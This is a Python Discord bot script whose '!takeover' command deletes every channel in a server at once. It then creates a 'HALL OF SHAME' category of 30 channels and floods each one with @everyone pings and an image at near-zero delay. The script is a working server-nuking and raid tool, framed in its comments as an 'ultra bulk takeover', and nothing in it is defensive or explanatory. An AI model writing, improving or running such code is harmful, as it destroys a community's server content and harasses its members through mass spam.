import os
import asyncio
import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"🔥 [ULTRA BULK TAKEOVER READY] Logged in as {bot.user}")

@bot.command(name="takeover")
@commands.has_permissions(administrator=True)
async def takeover(ctx):
    guild = ctx.guild
    
    # 1. Delete all existing channels concurrently to ensure maximum speed
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    # 2. Create the 'HALL OF SHAME' category
    try:
        shame_category = await guild.create_category("💀 ┃ HALL OF SHAME")
    except Exception as e:
        print(f"Category creation error: {e}")
        return

    # 3. Check for shame.png in the repository
    image_path = "shame.png"
    has_image = os.path.exists(image_path)

    # 4. Simultaneously create all 30 channels and blast messages instantly with zero lag
    async def create_and_spam(i):
        try:
            new_channel = await guild.create_text_channel(f"aap-{i}", category=shame_category)
            
            # Send 5 messages with @everyone and image concurrently per channel
            for _ in range(5):
                if has_image:
                    file_to_send = discord.File(image_path)
                    await new_channel.send("@everyone 🤣 **HALL OF SHAME** 🤣", file=file_to_send)
                else:
                    await new_channel.send("@everyone 🤣 **HALL OF SHAME** 🤣 (shame.png not found)")
                # Extremely tight interval for maximum bulk throughput
                await asyncio.sleep(0.02)
                
        except Exception as e:
            print(f"Channel {i} execution error: {e}")

    # Launch all 30 channel tasks simultaneously using asyncio.gather
    all_tasks = [create_and_spam(i) for i in range(1, 31)]
    await asyncio.gather(*all_tasks)

bot.run(os.getenv("DISCORD_BOT_TOKEN"))
